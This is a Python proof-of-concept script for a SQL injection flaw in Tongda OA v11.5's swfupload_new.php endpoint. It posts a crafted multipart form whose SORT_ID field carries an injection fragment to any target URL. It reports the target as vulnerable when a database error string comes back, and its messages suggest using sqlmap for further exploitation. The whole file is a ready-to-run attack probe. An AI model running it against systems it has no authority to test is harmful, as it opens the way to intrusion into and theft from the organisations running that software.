import time
import requests
import urllib3




def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding":"gzip",
        "Content-Type":"multipart/form-data; boundary=----------GFioQpMK0vv2"
        }
    data='''------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_ID"

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_NAME"

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="FILE_SORT"

2
------------GFioQpMK0vv2
Content-Disposition: form-data; name="SORT_ID"

0--
------------GFioQpMK0vv2--
'''
    exp_url=target_url+'general/file_folder/swfupload_new.php'
    success_msg = now_time() + '[SUCCESS]  可能存在POST_sql注入漏洞,请使用sqlmap尝试进一步利用 '
    warning_msg = now_time() + '[WARNING]  不存在通达OA v11.5 swfupload_new.php SQL注入漏洞 '
    error_msg = now_time() + '[ERROR][通达OA v11.5 swfupload_new.php SQL注入漏洞] 未知错误，无法利用poc请求目标或被目标拒绝请求 '
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(exp_url, headers=headers, data=data, verify=False)
        if upload.status_code == 200 and '不安全的SQL语句' in upload.text:
            return success_msg
        else:
            return warning_msg
        #    print(warning_msg)
    except:
       # print(error_msg)
        return error_msg
        

            
        